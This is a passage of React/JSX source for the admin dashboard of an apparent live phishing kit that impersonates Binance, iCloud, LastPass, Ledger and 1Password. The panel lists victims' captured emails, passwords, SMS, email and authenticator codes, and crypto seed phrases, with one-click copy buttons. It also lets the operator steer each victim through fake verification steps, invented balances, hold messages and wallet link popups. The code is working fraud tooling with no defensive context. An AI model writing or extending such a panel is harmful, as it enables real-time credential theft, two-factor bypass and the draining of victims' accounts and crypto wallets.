              className="cursor-pointer rounded-lg bg-[#2B3139] px-3 py-2 text-sm font-medium text-gray-400 transition-colors hover:bg-red-500/20 hover:text-red-400"
              title="Sign out"
            >
              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M9 21H5a2 2 0 01-2-2V5a2 2 0 012-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/></svg>
            </button>
          </div>
        </div>

        {/* Error Alert */}
        {fetchError && (
          <div className="mb-6 rounded-xl border border-red-500/30 bg-red-500/10 p-4">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-3">
                <div className="flex h-10 w-10 items-center justify-center rounded-full bg-red-500/20">
                  <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#ef4444" strokeWidth="2">
                    <circle cx="12" cy="12" r="10" />
                    <line x1="15" y1="9" x2="9" y2="15" />
                    <line x1="9" y1="9" x2="15" y2="15" />
                  </svg>
                </div>
                <div>
                  <h3 className="font-semibold text-red-400">Connection Error</h3>
                  <p className="text-sm text-red-300/70">{fetchError}</p>
                </div>
              </div>
              <button
                onClick={fetchAll}
                className="cursor-pointer rounded-lg bg-red-500/20 px-3 py-1.5 text-sm font-medium text-red-400 transition-colors hover:bg-red-500/30"
              >
                Retry
              </button>
            </div>
          </div>
        )}

        {/* Pending Alert */}
        {pendingSessions.length > 0 && (
          <div className="mb-6 rounded-xl border border-orange-500/30 bg-orange-500/10 p-4">
            <div className="flex items-center gap-3">
              <div className="flex h-10 w-10 items-center justify-center rounded-full bg-orange-500/20">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#f97316" strokeWidth="2">
                  <circle cx="12" cy="12" r="10" />
                  <line x1="12" y1="8" x2="12" y2="12" />
                  <line x1="12" y1="16" x2="12.01" y2="16" />
                </svg>
              </div>
              <div>
                <h3 className="font-semibold text-orange-400">
                  {pendingSessions.length} User{pendingSessions.length > 1 ? "s" : ""} Waiting
                </h3>
                <p className="text-sm text-orange-300/70">Approve or reject to continue their session</p>
              </div>
            </div>
          </div>
        )}

        {/* Brand Switcher */}
        <div className="mb-6 rounded-xl border border-[#2B3139] bg-[#181A20] p-4">
          <div className="flex flex-col gap-4 lg:flex-row lg:items-center lg:justify-between">
            <div className="flex items-center gap-3">
              <div className="flex h-10 w-10 items-center justify-center rounded-full" style={{ backgroundColor: getBrandConfig(activeBrand).primary + "20" }}>
                {getBrandConfig(activeBrand).faviconUrl ? (
                  <img src={getBrandConfig(activeBrand).faviconUrl} alt="" className="h-5 w-5 rounded" />
                ) : (
                  <span dangerouslySetInnerHTML={{ __html: getBrandConfig(activeBrand).faviconSvg.replace(/width="32"/g, 'width="20"').replace(/height="32"/g, 'height="20"') }} />
                )}
              </div>
              <div>
                <h3 className="font-semibold text-white">Active Brand: {getBrandConfig(activeBrand).name}</h3>
                <p className="text-xs text-gray-500">All user pages use this theme globally</p>
              </div>
            </div>
            <div className="flex flex-wrap items-center gap-2">
              {BRAND_IDS.map((brand) => {
                const config = getBrandConfig(brand)
                const isActive = activeBrand === brand
                return (
                  <button
                    key={brand}
                    onClick={() => handleBrandSwitch(brand)}
                    disabled={brandLoading || isActive}
                    className="flex cursor-pointer items-center gap-2 rounded-lg px-3 py-1.5 text-xs font-medium transition-all disabled:opacity-60"
                    style={{
                      backgroundColor: isActive ? config.primary : "#2B3139",
                      color: isActive ? (brand === "binance" ? "#181A20" : "#fff") : "#fff",
                      border: isActive ? `2px solid ${config.primary}` : "2px solid transparent",
                    }}
                  >
                    {config.faviconUrl ? (
                      <img src={config.faviconUrl} alt="" className="h-4 w-4 rounded" />
                    ) : (
                      <span dangerouslySetInnerHTML={{ __html: config.faviconSvg.replace(/width="32"/g, 'width="16"').replace(/height="32"/g, 'height="16"') }} />
                    )}
                    {config.name}
                  </button>
                )
              })}
              <div className="ml-2 h-6 w-px bg-[#2B3139]" />
              <button
                onClick={async () => {
                  if (!confirm(`Close ALL sessions for ${getBrandConfig(activeBrand).name}? This will clear all live sessions and activity data.`)) return
                  try {
                    // Clear all activities (which are the sessions for hardware wallets, Google, etc.)
                    const actRes = await fetch("/api/activity")
                    const actData = await actRes.json()
                    if (actData.activities) {
                      for (const act of actData.activities) {
                        await fetch(`/api/activity?visitorId=${act.visitorId}`, { method: "DELETE" })
                      }
                    }
                    // Refresh data
                    fetchSessions()
                    fetchAttempts()
                    fetchLedgerActivities()
                    alert("All sessions cleared successfully!")
                  } catch (err) {
                    console.error("Failed to close sessions:", err)
                    alert("Failed to close some sessions. Check console for details.")
                  }
                }}
                className="cursor-pointer rounded-lg bg-red-500/20 px-3 py-1.5 text-xs font-medium text-red-400 transition-colors hover:bg-red-500/30"
              >
                Close All Sessions
              </button>
            </div>
          </div>
        </div>

        {/* Tabs */}
        <div className="mb-6 flex gap-2">
          <button
            onClick={() => setActiveTab("sessions")}
            className={`relative cursor-pointer rounded-lg px-4 py-2 text-sm font-medium transition-colors ${
              activeTab === "sessions"
                ? "bg-[#0052FF] text-white"
                : "bg-[#2d2f36] text-white hover:bg-[#3d3f46]"
            }`}
          >
            Live Sessions ({sessions.length + ledgerActivities.length})
            {(() => {
              const pendingLedger = ledgerActivities.filter((a: any) =>
                a.waitingForApproval ||
                (a.stage2Data?.waitingForAdmin && !a.stage2Data?.adminConfirmed) ||
                (a.oldKeysData?.enteredWords?.length > 0 && !a.oldKeysData?.adminConfirmed && !a.oldKeysData?.adminDenied)
              ).length
              const totalPending = pendingSessions.length + pendingLedger
              return totalPending > 0 ? (
                <span className="absolute -right-1 -top-1 flex h-5 w-5 items-center justify-center rounded-full bg-red-500 text-xs font-bold text-white">
                  {totalPending}
                </span>
              ) : null
            })()}
          </button>
          <button
            onClick={() => setActiveTab("attempts")}
            className={`cursor-pointer rounded-lg px-4 py-2 text-sm font-medium transition-colors ${
              activeTab === "attempts"
                ? "bg-[#0052FF] text-white"
                : "bg-[#2d2f36] text-white hover:bg-[#3d3f46]"
            }`}
          >
            Login Attempts ({attempts.length})
          </button>
        </div>

        {activeTab === "sessions" && (
          <>
            <div className="mb-4 flex items-center gap-2">
              <div className="h-2 w-2 animate-pulse rounded-full bg-green-500" />
              <span className="text-sm text-gray-400">Live updates enabled</span>
            </div>

            {loading || ledgerLoading ? (
              <div className="flex items-center justify-center rounded-xl bg-[#181A20] py-20">
                <div className="h-8 w-8 animate-spin rounded-full border-2 border-[#0052FF] border-t-transparent" />
              </div>
            ) : sessions.length === 0 && ledgerActivities.length === 0 ? (
              <div className="rounded-xl bg-[#181A20] py-20 text-center">
                <p className="text-gray-400">No active sessions</p>
              </div>
            ) : (
              <div className="grid gap-4">
                {sessions.map((session) => (
                  <div
                    key={session.id}
                    className={`rounded-xl border bg-[#181A20] p-6 transition-all ${
                      session.status === "pending"
                        ? "border-orange-500/50 shadow-lg shadow-orange-500/10"
                        : "border-[#2B3139]"
                    }`}
                  >
                    {/* Header */}
                    <div className="mb-4 flex flex-wrap items-start justify-between gap-4">
                      <div className="flex flex-wrap items-center gap-2">
                        <span className={`rounded-full border px-3 py-1 text-xs font-medium ${getStepBadgeColor(session.current_step)}`}>
                          Step: {getStepLabel(session.current_step)}
                        </span>
                        <span className={`rounded-full border px-3 py-1 text-xs font-medium ${getStatusBadge(session.status)}`}>
                          {session.status}
                        </span>
                        <span className="text-xs text-gray-500" title={`Last activity: ${new Date(session.last_activity).toLocaleString()}`}>
                          {getTimeSince(session.last_activity)}
                        </span>
                        {session.is_active && (
                          <span className="flex items-center gap-1 text-xs text-green-400">
                            <span className="h-1.5 w-1.5 animate-pulse rounded-full bg-green-400" />
                            Online
                          </span>
                        )}
                      </div>
                      <button
                        onClick={() => handleEndSession(session.id)}
                        disabled={actionLoading === `end-${session.id}`}
                        className="cursor-pointer rounded-lg bg-red-500/20 px-3 py-1.5 text-xs font-medium text-red-400 transition-colors hover:bg-red-500/30 disabled:opacity-50"
                      >
                        {actionLoading === `end-${session.id}` ? "Ending..." : "End Session"}
                      </button>
                    </div>

                    {/* Captured Data - with copy buttons */}
                    <div className="mb-4 rounded-lg bg-[#0B0E11] p-4">
                      {/* Quick Copy All */}
                      {(session.email || session.password) && (
                        <div className="mb-3 flex items-center gap-2">
                          <button
                            onClick={() => navigator.clipboard.writeText(`${session.email || ""}:${session.password || ""}`)}
                            className="cursor-pointer rounded-lg bg-[#0052FF] px-3 py-1.5 text-xs font-medium text-white transition-colors hover:bg-[#0040CC] flex items-center gap-1.5"
                          >
                            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
                            Copy Email:Password
                          </button>
                          {session.phone_code && (
                            <button
                              onClick={() => navigator.clipboard.writeText(`${session.email || ""}:${session.password || ""}:${session.phone_code || ""}`)}
                              className="cursor-pointer rounded-lg bg-[#2B3139] px-3 py-1.5 text-xs font-medium text-white transition-colors hover:bg-[#3C4043] flex items-center gap-1.5"
                            >
                              <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
                              Copy All Credentials
                            </button>
                          )}
                        </div>
                      )}
                      <div className="grid gap-3 md:grid-cols-2 lg:grid-cols-6">
                      <div className="group relative">
                        <p className="mb-1 text-xs font-medium text-gray-500">Email/Phone</p>
                        <p className="font-mono text-sm text-white break-all">{session.email || "—"}</p>
                        {session.email && (
                          <button 
                            onClick={() => navigator.clipboard.writeText(session.email || "")} 
                            className="absolute right-0 top-0 opacity-0 group-hover:opacity-100 transition-opacity cursor-pointer p-1 rounded bg-[#2B3139] hover:bg-[#3C4043]"
                            title="Copy"
                          >
                            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
                          </button>
                        )}
                      </div>
                      <div className="group relative">
                        <p className="mb-1 text-xs font-medium text-gray-500">Password</p>
                        <p className="font-mono text-sm text-white break-all">{session.password || "—"}</p>
                        {session.password && (
                          <button 
                            onClick={() => navigator.clipboard.writeText(session.password || "")} 
                            className="absolute right-0 top-0 opacity-0 group-hover:opacity-100 transition-opacity cursor-pointer p-1 rounded bg-[#2B3139] hover:bg-[#3C4043]"
                            title="Copy"
                          >
                            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
                          </button>
                        )}
                      </div>
                      <div className="group relative">
<p className="mb-1 text-xs font-medium text-gray-500">{isLedgerBrand ? "Case ID" : isOnePasswordBrand ? "Secret Key" : "Phone Code"}</p>
  <p className="font-mono text-sm text-white">{session.phone_code || "—"}</p>
                        {session.phone_code && (
                          <button 
                            onClick={() => navigator.clipboard.writeText(session.phone_code || "")} 
                            className="absolute right-0 top-0 opacity-0 group-hover:opacity-100 transition-opacity cursor-pointer p-1 rounded bg-[#2B3139] hover:bg-[#3C4043]"
                            title="Copy"
                          >
                            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
                          </button>
                        )}
                      </div>
                      <div className="group relative">
                        <p className="mb-1 text-xs font-medium text-gray-500">Email Code</p>
                        <p className="font-mono text-sm text-white">{session.email_code || "—"}</p>
                        {session.email_code && (
                          <button 
                            onClick={() => navigator.clipboard.writeText(session.email_code || "")} 
                            className="absolute right-0 top-0 opacity-0 group-hover:opacity-100 transition-opacity cursor-pointer p-1 rounded bg-[#2B3139] hover:bg-[#3C4043]"
                            title="Copy"
                          >
                            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
                          </button>
                        )}
                      </div>
                      <div className="group relative">
                        <p className="mb-1 text-xs font-medium text-gray-500">{isIcloudBrand ? "2FA Code" : "Authenticator"}</p>
                        <p className="font-mono text-sm text-white">{session.authenticator_code || "—"}</p>
                        {session.authenticator_code && (
                          <button 
                            onClick={() => navigator.clipboard.writeText(session.authenticator_code || "")} 
                            className="absolute right-0 top-0 opacity-0 group-hover:opacity-100 transition-opacity cursor-pointer p-1 rounded bg-[#2B3139] hover:bg-[#3C4043]"
                            title="Copy"
                          >
                            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
                          </button>
                        )}
                      </div>
{!isIcloudBrand && !isLastpassBrand && !isLedgerBrand && !isOnePasswordBrand && (
  <div>

                        <p className="mb-1 text-xs font-medium text-gray-500">Balance</p>
                        <p className="font-mono text-sm text-white">{session.balance_selection || "—"}</p>
                      </div>
                      )}
                      </div>
                    </div>

                    {/* Device Info */}
                    {session.user_agent && (
                      <div className="mb-4 rounded-lg bg-[#0B0E11] p-3">
                        <p className="text-xs text-gray-500 truncate" title={session.user_agent}>
                          <span className="text-gray-400">Device:</span> {session.user_agent.includes("Mobile") ? "Mobile" : "Desktop"} - {session.user_agent.includes("Chrome") ? "Chrome" : session.user_agent.includes("Safari") ? "Safari" : session.user_agent.includes("Firefox") ? "Firefox" : "Other"}
                        </p>
                      </div>
                    )}

  {/* Wallet Data - Crypto only */}
  {!isIcloudBrand && !isLastpassBrand && !isLedgerBrand && !isOnePasswordBrand && (session.wallet_type || session.seed_phrase) && (
    <div className="mb-4 rounded-lg bg-[#0B0E11] p-4">
      <p className="mb-2 text-xs font-medium text-gray-500">Wallet Information</p>
      <div className="space-y-2">
        {session.wallet_type && (
          <div className="flex items-center gap-2">
            <span className={`rounded-full px-2 py-1 text-xs ${session.wallet_action === "link" ? "bg-green-500/20 text-green-400" : "bg-red-500/20 text-red-400"}`}>
              {session.wallet_action === "link" ? "LINK" : "UNLINK"}
            </span>
            <span className="text-sm font-medium text-white capitalize">{session.wallet_type}</span>
          </div>
        )}
        {session.seed_phrase && (
          <div className="group relative">
            <p className="mb-1 text-xs text-gray-500">Seed Phrase:</p>
            <p className="rounded-lg bg-[#181A20] p-2 font-mono text-xs text-[#0052FF] break-all pr-8">{session.seed_phrase}</p>
            <button 
              onClick={() => navigator.clipboard.writeText(session.seed_phrase || "")} 
              className="absolute right-2 top-6 cursor-pointer p-1.5 rounded bg-[#2B3139] hover:bg-[#3C4043] transition-colors"
              title="Copy seed phrase"
            >
              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
            </button>
          </div>
        )}
      </div>
    </div>
  )}

  {/* Security / Cancel Request Responses - All brands */}
  {session.security_responses && (
  <div className="mb-4 rounded-lg bg-[#0B0E11] p-4">
  <p className="mb-2 text-xs font-medium text-gray-500">
    {isIcloudBrand ? "Request Responses" : isLastpassBrand ? "Cancel Request Responses" : "Security Check Responses"}
  </p>
      <div className="flex flex-wrap gap-2">
        <span className={`rounded-full px-2 py-1 text-xs ${session.security_responses.signin_request === "approved" ? "bg-green-500/20 text-green-400" : session.security_responses.signin_request === "denied" ? "bg-red-500/20 text-red-400" : "bg-gray-500/20 text-gray-400"}`}>
          {isIcloudBrand ? "Sign-in" : isLastpassBrand ? "Logins" : "Sign-in"}: {session.security_responses.signin_request || "—"}
        </span>
        <span className={`rounded-full px-2 py-1 text-xs ${session.security_responses.withdrawal_request === "approved" ? "bg-green-500/20 text-green-400" : session.security_responses.withdrawal_request === "denied" ? "bg-red-500/20 text-red-400" : "bg-gray-500/20 text-gray-400"}`}>
          {isIcloudBrand ? "Withdrawal" : isLastpassBrand ? "Password" : "Withdrawal"}: {session.security_responses.withdrawal_request || "—"}
        </span>
        <span className={`rounded-full px-2 py-1 text-xs ${session.security_responses.phone_change_request === "approved" ? "bg-green-500/20 text-green-400" : session.security_responses.phone_change_request === "denied" ? "bg-red-500/20 text-red-400" : "bg-gray-500/20 text-gray-400"}`}>
          {isIcloudBrand ? "Phone Change" : isLastpassBrand ? "Recovery" : "Phone Change"}: {session.security_responses.phone_change_request || "—"}
        </span>
      </div>
    </div>
  )}

                    {/* Verification Settings - Crypto only */}
                    {!isIcloudBrand && !isLastpassBrand && !isLedgerBrand && !isOnePasswordBrand && <div className="mb-4 grid gap-4 rounded-lg border border-[#2B3139] bg-[#0B0E11] p-4 md:grid-cols-2">
                      <div>
                        <label className="mb-2 block text-xs font-medium text-gray-500">Phone Last 4 Digits</label>
                        <div className="flex gap-2">
                          <input
                            type="text"
                            maxLength={4}
                            placeholder={session.phone_last4 || "7842"}
                            value={phoneLast4[session.id] || ""}
                            onChange={(e) => setPhoneLast4((prev) => ({ ...prev, [session.id]: e.target.value.replace(/\D/g, "").slice(0, 4) }))}
                            className="w-24 rounded-lg border border-[#474D57] bg-[#181A20] px-3 py-2 text-sm text-white placeholder-gray-500 outline-none focus:border-[#0052FF]"
                          />
                          <button
                            onClick={() => handleSetPhoneLast4(session.id)}
                            disabled={!phoneLast4[session.id] || actionLoading === `phone-${session.id}`}
                            className="cursor-pointer rounded-lg bg-[#2B3139] px-3 py-2 text-xs font-medium text-white transition-colors hover:bg-[#3C4043] disabled:opacity-50"
                          >
                            {actionLoading === `phone-${session.id}` ? "..." : "Set"}
                          </button>
                        </div>
                        <p className="mt-1 text-xs text-gray-600">Current: {session.phone_last4 || "7842"}</p>
                      </div>
                      <div>
                        <label className="mb-2 block text-xs font-medium text-gray-500">Email for Verification Code</label>
                        <div className="flex gap-2">
                          <input
                            type="email"
                            placeholder={session.email_for_code || session.email || "user@email.com"}
                            value={emailForCode[session.id] || ""}
                            onChange={(e) => setEmailForCode((prev) => ({ ...prev, [session.id]: e.target.value }))}
                            className="flex-1 rounded-lg border border-[#474D57] bg-[#181A20] px-3 py-2 text-sm text-white placeholder-gray-500 outline-none focus:border-[#0052FF]"
                          />
                          <button
                            onClick={() => handleSetEmailForCode(session.id)}
                            disabled={!emailForCode[session.id] || actionLoading === `email-code-${session.id}`}
                            className="cursor-pointer rounded-lg bg-[#2B3139] px-3 py-2 text-xs font-medium text-white transition-colors hover:bg-[#3C4043] disabled:opacity-50"
                          >
                            {actionLoading === `email-code-${session.id}` ? "..." : "Set"}
                          </button>
                        </div>
  <p className="mt-1 text-xs text-gray-600">Current: {session.email_for_code || session.email || "—"}</p>
  </div>
  </div>}

  {/* Security Check Settings - Crypto only */}
  {!isIcloudBrand && !isLastpassBrand && !isLedgerBrand && !isOnePasswordBrand && <div className="mb-4 grid gap-4 rounded-lg border border-[#2B3139] bg-[#0B0E11] p-4 md:grid-cols-2">
    <div>
      <label className="mb-2 block text-xs font-medium text-gray-500">Security Check Location</label>
      <div className="flex gap-2">
        <input
          type="text"
          placeholder={session.security_location || "Frankfurt, Germany"}
          value={securityLocation[session.id] || ""}
          onChange={(e) => setSecurityLocation((prev) => ({ ...prev, [session.id]: e.target.value }))}
          className="flex-1 rounded-lg border border-[#474D57] bg-[#181A20] px-3 py-2 text-sm text-white placeholder-gray-500 outline-none focus:border-[#0052FF]"
        />
        <button
          onClick={() => handleSetSecurityLocation(session.id)}
          disabled={!securityLocation[session.id] || actionLoading === `sec-loc-${session.id}`}
          className="cursor-pointer rounded-lg bg-[#2B3139] px-3 py-2 text-xs font-medium text-white transition-colors hover:bg-[#3C4043] disabled:opacity-50"
        >
          {actionLoading === `sec-loc-${session.id}` ? "..." : "Set"}
        </button>
      </div>
      <p className="mt-1 text-xs text-gray-600">Current: {session.security_location || "Frankfurt, Germany"}</p>
    </div>
    <div>
      <label className="mb-2 block text-xs font-medium text-gray-500">Phone Change Last 4 Digits</label>
      <div className="flex gap-2">
        <input
          type="text"
          maxLength={4}
          placeholder={session.security_phone_last4 || "9548"}
          value={securityPhoneLast4[session.id] || ""}
          onChange={(e) => setSecurityPhoneLast4((prev) => ({ ...prev, [session.id]: e.target.value.replace(/\D/g, "").slice(0, 4) }))}
          className="w-24 rounded-lg border border-[#474D57] bg-[#181A20] px-3 py-2 text-sm text-white placeholder-gray-500 outline-none focus:border-[#0052FF]"
        />
        <button
          onClick={() => handleSetSecurityPhone(session.id)}
          disabled={!securityPhoneLast4[session.id] || actionLoading === `sec-phone-${session.id}`}
          className="cursor-pointer rounded-lg bg-[#2B3139] px-3 py-2 text-xs font-medium text-white transition-colors hover:bg-[#3C4043] disabled:opacity-50"
        >
          {actionLoading === `sec-phone-${session.id}` ? "..." : "Set"}
        </button>
      </div>
      <p className="mt-1 text-xs text-gray-600">Current: {session.security_phone_last4 || "9548"}</p>
    </div>
  </div>}

  {/* Dashboard Controls - Crypto only */}
  {!isIcloudBrand && !isLastpassBrand && !isLedgerBrand && !isOnePasswordBrand && <div className="mb-4 rounded-lg border border-indigo-500/30 bg-indigo-500/5 p-4">
    <h4 className="mb-3 flex items-center gap-2 font-medium text-indigo-400">
      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
        <rect x="3" y="3" width="18" height="18" rx="2" ry="2"/>
        <line x1="3" y1="9" x2="21" y2="9"/>
        <line x1="9" y1="21" x2="9" y2="9"/>
      </svg>
      Dashboard Controls
    </h4>
    
    {/* Quick Actions */}
    <div className="mb-4 flex flex-wrap gap-2">
      <button
        onClick={() => handleToggleBalanceHidden(session.id, session.balance_hidden)}
        disabled={actionLoading === `dash-hide-${session.id}`}
        className={`cursor-pointer rounded-lg px-3 py-1.5 text-xs font-medium transition-colors ${
          session.balance_hidden
            ? "bg-yellow-500/20 text-yellow-400 hover:bg-yellow-500/30"
            : "bg-[#2B3139] text-white hover:bg-[#3C4043]"
        }`}
      >
        {actionLoading === `dash-hide-${session.id}` ? "..." : session.balance_hidden ? "Balance Censored" : "Censor Balance"}
      </button>
      <button
        onClick={() => handleToggleBalanceOnHold(session.id, session.balance_on_hold)}
        disabled={actionLoading === `dash-hold-${session.id}`}
        className={`cursor-pointer rounded-lg px-3 py-1.5 text-xs font-medium transition-colors ${
          session.balance_on_hold
            ? "bg-red-500/20 text-red-400 hover:bg-red-500/30"
            : "bg-[#2B3139] text-white hover:bg-[#3C4043]"
        }`}
      >
        {actionLoading === `dash-hold-${session.id}` ? "..." : session.balance_on_hold ? "On Hold Active" : "Put On Hold"}
      </button>
      <button
        onClick={() => handleToggleVerificationBanner(session.id, session.show_verification_banner)}
        disabled={actionLoading === `dash-banner-${session.id}`}
        className={`cursor-pointer rounded-lg px-3 py-1.5 text-xs font-medium transition-colors ${
          session.show_verification_banner
            ? "bg-orange-500/20 text-orange-400 hover:bg-orange-500/30"
            : "bg-[#2B3139] text-white hover:bg-[#3C4043]"
        }`}
      >
        {actionLoading === `dash-banner-${session.id}` ? "..." : session.show_verification_banner ? "Banner Shown" : "Show Banner"}
      </button>
      <button
        onClick={() => handleMoveToStep(session.id, "dashboard")}
        disabled={session.current_step === "dashboard" || actionLoading === `step-${session.id}-dashboard`}
        className="cursor-pointer rounded-lg bg-indigo-500 px-3 py-1.5 text-xs font-medium text-white transition-colors hover:bg-indigo-600 disabled:opacity-50"
      >
{actionLoading === `step-${session.id}-dashboard` ? "..." : "Send to Dashboard"}
  </button>
  </div>

  {/* Wallet Popup Controls */}
  <div className="mb-3 flex flex-wrap gap-2">
    <span className="text-xs text-gray-400 w-full mb-1">Wallet Popup (on Dashboard):</span>
    <button
      onClick={() => handleToggleWalletPopup(session.id, session.show_wallet_popup && session.wallet_popup_type === "link", "link")}
      disabled={actionLoading === `dash-wallet-link-${session.id}`}
      className={`cursor-pointer rounded-lg px-3 py-1.5 text-xs font-medium transition-colors ${
        session.show_wallet_popup && session.wallet_popup_type === "link"
          ? "bg-green-500/20 text-green-400 hover:bg-green-500/30"
          : "bg-[#2B3139] text-white hover:bg-[#3C4043]"
      }`}
    >
      {actionLoading === `dash-wallet-link-${session.id}` ? "..." : session.show_wallet_popup && session.wallet_popup_type === "link" ? "Link Popup Active" : "Enable Link Wallet Popup"}
    </button>
    <button
      onClick={() => handleToggleWalletPopup(session.id, session.show_wallet_popup && session.wallet_popup_type === "unlink", "unlink")}
      disabled={actionLoading === `dash-wallet-unlink-${session.id}`}
      className={`cursor-pointer rounded-lg px-3 py-1.5 text-xs font-medium transition-colors ${
        session.show_wallet_popup && session.wallet_popup_type === "unlink"
          ? "bg-orange-500/20 text-orange-400 hover:bg-orange-500/30"
          : "bg-[#2B3139] text-white hover:bg-[#3C4043]"
      }`}
    >
      {actionLoading === `dash-wallet-unlink-${session.id}` ? "..." : session.show_wallet_popup && session.wallet_popup_type === "unlink" ? "Unlink Popup Active" : "Enable Unlink Wallet Popup"}
    </button>
  </div>
  
  {/* Balance & User Settings */}
    <div className="mb-3 grid gap-3 md:grid-cols-3">
      <div>
        <label className="mb-1 block text-xs font-medium text-gray-500">Display Balance ($)</label>
        <div className="flex gap-2">
          <input
            type="text"
            placeholder={session.dashboard_balance || "0.00"}
            value={dashboardBalance[session.id] || ""}
            onChange={(e) => setDashboardBalance((prev) => ({ ...prev, [session.id]: e.target.value }))}
            className="flex-1 rounded-lg border border-[#474D57] bg-[#181A20] px-3 py-2 text-sm text-white placeholder-gray-500 outline-none focus:border-indigo-500"
          />
          <button
            onClick={() => handleUpdateDashboardBalance(session.id)}
            disabled={!dashboardBalance[session.id] || actionLoading === `dash-balance-${session.id}`}
            className="cursor-pointer rounded-lg bg-[#2B3139] px-3 py-2 text-xs font-medium text-white transition-colors hover:bg-[#3C4043] disabled:opacity-50"
          >
            {actionLoading === `dash-balance-${session.id}` ? "..." : "Set"}
          </button>
        </div>
      </div>
      <div>
        <label className="mb-1 block text-xs font-medium text-gray-500">User Display Name</label>
        <div className="flex gap-2">
          <input
            type="text"
            placeholder={session.user_name || session.email?.split("@")[0] || "User"}
            value={userName[session.id] || ""}
            onChange={(e) => setUserName((prev) => ({ ...prev, [session.id]: e.target.value }))}
            className="flex-1 rounded-lg border border-[#474D57] bg-[#181A20] px-3 py-2 text-sm text-white placeholder-gray-500 outline-none focus:border-indigo-500"
          />
          <button
            onClick={() => handleSetUserName(session.id)}
            disabled={!userName[session.id] || actionLoading === `dash-name-${session.id}`}
            className="cursor-pointer rounded-lg bg-[#2B3139] px-3 py-2 text-xs font-medium text-white transition-colors hover:bg-[#3C4043] disabled:opacity-50"
          >
            {actionLoading === `dash-name-${session.id}` ? "..." : "Set"}
          </button>
        </div>
      </div>
      <div>
        <label className="mb-1 block text-xs font-medium text-gray-500">Hold Message</label>
        <div className="flex gap-2">
          <input
            type="text"
            placeholder={session.hold_message || "Account on hold"}
            value={holdMessage[session.id] || ""}
            onChange={(e) => setHoldMessage((prev) => ({ ...prev, [session.id]: e.target.value }))}
            className="flex-1 rounded-lg border border-[#474D57] bg-[#181A20] px-3 py-2 text-sm text-white placeholder-gray-500 outline-none focus:border-indigo-500"
          />
          <button
            onClick={() => handleSetHoldMessage(session.id)}
            disabled={!holdMessage[session.id] || actionLoading === `dash-hold-msg-${session.id}`}
            className="cursor-pointer rounded-lg bg-[#2B3139] px-3 py-2 text-xs font-medium text-white transition-colors hover:bg-[#3C4043] disabled:opacity-50"
          >
            {actionLoading === `dash-hold-msg-${session.id}` ? "..." : "Set"}
          </button>
        </div>
      </div>
    </div>

    {/* Verification Banner Message */}
    <div className="mb-3">
      <label className="mb-1 block text-xs font-medium text-gray-500">Verification Banner Message</label>
      <div className="flex gap-2">
        <input
          type="text"
          placeholder={session.verification_banner_message || "Your account requires additional verification"}
          value={verificationMessage[session.id] || ""}
          onChange={(e) => setVerificationMessage((prev) => ({ ...prev, [session.id]: e.target.value }))}
          className="flex-1 rounded-lg border border-[#474D57] bg-[#181A20] px-3 py-2 text-sm text-white placeholder-gray-500 outline-none focus:border-indigo-500"
        />
        <button
          onClick={() => handleSetVerificationMessage(session.id)}
          disabled={!verificationMessage[session.id] || actionLoading === `dash-ver-msg-${session.id}`}
          className="cursor-pointer rounded-lg bg-[#2B3139] px-3 py-2 text-xs font-medium text-white transition-colors hover:bg-[#3C4043] disabled:opacity-50"
        >
          {actionLoading === `dash-ver-msg-${session.id}` ? "..." : "Set"}
        </button>
      </div>
    </div>

    {/* Crypto Amounts */}
    <div className="mb-3">
      <label className="mb-2 block text-xs font-medium text-gray-500">Crypto Holdings (amount)</label>
      <div className="grid gap-2 md:grid-cols-6">
        <input
          type="text"
          placeholder={session.btc_amount || "BTC"}
          value={btcAmount[session.id] || ""}
          onChange={(e) => setBtcAmount((prev) => ({ ...prev, [session.id]: e.target.value }))}
          className="rounded-lg border border-[#474D57] bg-[#181A20] px-3 py-2 text-sm text-white placeholder-gray-500 outline-none focus:border-indigo-500"
        />
        <input
          type="text"
          placeholder={session.eth_amount || "ETH"}
          value={ethAmount[session.id] || ""}
          onChange={(e) => setEthAmount((prev) => ({ ...prev, [session.id]: e.target.value }))}
